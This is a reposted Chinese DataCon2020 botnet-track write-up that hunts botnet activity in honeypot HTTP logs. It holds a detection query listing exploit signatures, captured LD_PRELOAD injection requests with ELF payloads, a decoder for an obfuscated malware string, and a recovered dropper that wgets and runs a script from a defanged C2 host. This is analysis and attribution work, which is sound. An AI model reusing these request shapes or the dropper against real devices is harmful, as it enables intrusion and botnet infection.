# DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）

> 原文: https://www.ctfiot.com/74662.html
> ID: 74662


```
-- 存在疑似漏洞的http请求
select
 url,
 count(1) as cn
from honeypot_http_log
where
 url not rlike
 CONCAT(
 -- black
 "echo >NiGGeR|",
 "Account\\.User1\\.Password>\\$\\(|"
 "shell_exec\\(|",
 "busybox.*?wget.*?\\./|",
 "invokefunction&function=call_user_func_array|",
 "content=|",
 "/language/Swedish\\$\\{IFS\\}|",
 "/model/__show_info\\.php\\?REQUIRE_FILE=|",
 "wget( |\\+)|",
 "/shellinvoker/shellinvoker\\.jsp|",
 "/invoker/JMXInvokerServlet|",
 "/jbossass/jbossass\\.jsp|",
 "certutil\\.exe|",
 "\\\\think\\\\template\\\\driver\\\\file/write&cacheFile|",
 "<\\?php|",
 "FxCodeShell\\.jsp|",
 "<%@|",
 "shell\\.jsp|",
 "java\\.lang\\.System|"
 -- white
 "CHANGELOG\\.txt|",
 "snapshot\\.cgi"
 )
 and LENGTH(url) >= 32
group by url
order by cn desc limit 99999999
;
method: POST
uri: cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0
post data: \x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00...
编译源码
make
make --no-print-directory -f /root/xgoahead/projects/xgoahead-linux-default.mk all
xgoahead -v --home /etc/xgoahead /var/www/xgoahead
where concat(uri,host,post_data) rlike '\\b[A-Z_]{7,}\\b'
URI: admin/login.cgi

POST Data:
----------------------------70089496549461931699051
Content-Disposition: form-data; name="f"; filename="2.elf"
Content-Type: application/octet-stream

\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00...
----------------------------700894965494619316990515
Content-Disposition: form-data; name="%4cD%5f%50%52E%4c%4f%41D"

tmp/tmp-0.tmp tmp/tmp-1.tmp tmp/tmp-2.tmp....
----------------------------700894965494619316990515--
# -*- coding: utf-8 -*-

g_enc_table_1 = "\xC5\xC6\x82\x91\xD6\xCF\xD2\x9D\xD9\xC9\xC7\xD6\x82\xCA\xD6\xD6\xD2\x9C\x91\x91\xC7\xDA\xC7\xC5\x90\xC6\xD6\xC6\xD6\xC6\xD6\x90\xCB\xD0\xC8\xD1\x91\xC6\x90\xD5\xCA\x9D\xC5\xCA\xCF\xD1\xC6\x82\x99\x99\x99\x82\xC6\x90\xD5\xCA\x9D\x90\x91\xC6\x90\xD5\xCA"
g_enc_table_2 = "\xAE\xA6\xC1\xB2\xB4\xA7\xAE\xB1\xA3\xA6"

def sub_5C4(input_str):
 str = ""
 for c in input_str:
 str += chr(ord(c) - 98)

 return str

if __name__ == '__main__':
 print sub_5C4(g_enc_table_1)
 print sub_5C4(g_enc_table_2)
cd /tmp;
wget http[:]//exec[.]dtdtdt[.]info/d.sh;chmod 777 d.sh;
./d.sh
LD_PRELOAD
xy@x-8 ~/D/datacon> md5 elf_1
MD5 (elf_1) = d08b638fdafac0c1ebbdcad05d5c2fcb
xy@x-8 ~/D/datacon> md5 elf_2
MD5 (elf_2) = 56ec8709c083963e208faec59d2b41e1
xy@x-8 ~/D/datacon> md5 elf_3
MD5 (elf_3) = 7006ae30aedeb0e423a86cb50914d45c
xy@x-8 ~/D/datacon> md5 elf_4
MD5 (elf_4) = 695da36ee841a57df84a473cb821710e
select * from passive_dns_data
where dns in (
 "exec[.]kfckiller[.]cc",
 "exec[.]dtdtdt[.]info",
 "control[.]dtdtdt[.]info"
)
;
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_6375d59831c22.png)